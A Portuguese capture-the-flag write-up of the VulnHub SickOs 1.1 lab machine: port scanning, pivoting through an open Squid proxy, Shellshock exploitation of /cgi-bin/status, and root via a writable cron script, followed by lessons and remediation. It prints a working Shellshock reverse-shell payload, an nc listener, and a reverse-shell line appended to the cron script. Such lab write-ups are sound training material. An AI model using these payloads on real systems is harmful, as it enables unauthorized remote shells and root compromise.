# SickOs: 1.1 — Writeup (PT-BR)

> Versão legada. O writeup completo e expandido está em [`../sickos-11/`](../sickos-11/).

| | |
|-|-|
| **IP Alvo** | 192.168.56.X (host-only) |
| **Dificuldade** | Intermediário |
| **Sistema Operacional** | Linux (Ubuntu) |
| **Flag** | `/root/a0216ea4d51874464078c618298b1367.txt` |
| **Fonte** | [VulnHub](https://www.vulnhub.com/entry/sickos-11,132/) |

## Resumo do Ataque

Varredura de rede → Proxy SQUID na porta 3128 → roteamento HTTP pelo proxy → `/cgi-bin/status` → Shellshock (CVE-2014-6271) → shell reversa como `www-data` → script cron.d com permissão de escrita → shell root.

## Metodologia

1. Descoberta de rede e varredura de portas
2. Descoberta do proxy SQUID na porta 3128
3. Uso do proxy SQUID para acessar o servidor web interno
4. Descoberta do endpoint `/cgi-bin/status`
5. Exploração do Shellshock via proxy
6. Pós-exploração: escalada de privilégios via cron

---

## Passo 1: Descoberta de Rede

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.X
```

Portas abertas: 22 (SSH), 3128 (SQUID proxy), 443 (HTTPS).

---

## Passo 2: Configuração do Proxy SQUID

Configure o Burp Suite ou o navegador para usar o proxy SQUID:

```
Host: 192.168.56.X
Porta: 3128
```

Ou use curl com o proxy:

```bash
curl --proxy http://192.168.56.X:3128 http://192.168.56.X/
```

Isso revela o servidor web interno acessível pelo proxy.

---

## Passo 3: Descoberta do Endpoint CGI

Enumere diretórios:

```bash
curl --proxy http://192.168.56.X:3128 http://192.168.56.X/cgi-bin/status
```

O endpoint `/cgi-bin/status` está acessível, o que indica um potencial vetor Shellshock.

---

## Passo 4: Exploração do Shellshock (CVE-2014-6271)

Shellshock afeta scripts CGI executados pelo bash. O payload no cabeçalho User-Agent é executado como o processo CGI:

```bash
curl -A "() { :; }; /bin/bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1" \
  --proxy http://192.168.56.X:3128 \
  http://192.168.56.X/cgi-bin/status
```

Em outra janela, prepare o listener:

```bash
nc -lvnp 4444
```

Uma shell reversa como `www-data` é recebida.

---

## Passo 5: Escalada de Privilégios via Cron

Enumere tarefas agendadas e scripts com permissão de escrita:

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/automate
```

Se o script referenciado no cron for gravável por `www-data`:

```bash
echo "bash -i >& /dev/tcp/<SEU_IP>/5555 0>&1" >> /path/to/script.py
```

Aguarde a execução do cron. Uma shell root é recebida.

---

## Lições Aprendidas

1. **Shellshock (CVE-2014-6271)**: uma das vulnerabilidades mais críticas da história do Unix. Qualquer servidor com CGI rodando bash estava vulnerável antes do patch. Sempre atualize o bash e audite endpoints CGI.
2. **Proxy SQUID mal configurado**: um proxy interno exposto sem autenticação permite pivô para serviços internos. Implemente autenticação no proxy e limite o acesso por IP.
3. **Scripts cron com permissão de escrita por usuários não privilegiados**: um risco crítico. Audite regularmente: `find /etc/cron* -writable 2>/dev/null`.
4. **Princípio do menor privilégio**: `www-data` não deve ter permissão de escrita em scripts executados como root.

## Remediação

| Vulnerabilidade | Correção |
|---|---|
| Shellshock CVE-2014-6271 | Atualize o bash para versão corrigida; desative CGI se não necessário |
| Proxy SQUID sem autenticação | Adicione autenticação; restrinja por IP; audite regras de ACL |
| Script cron gravável por www-data | Corrija permissões: `chmod 750`; propriedade root:root |
| Bash em scripts CGI | Use shebang explícito com shell não vulnerável ou substitua por Python/Perl |

Thanks guys!! (❍ᴥ❍ʋ)
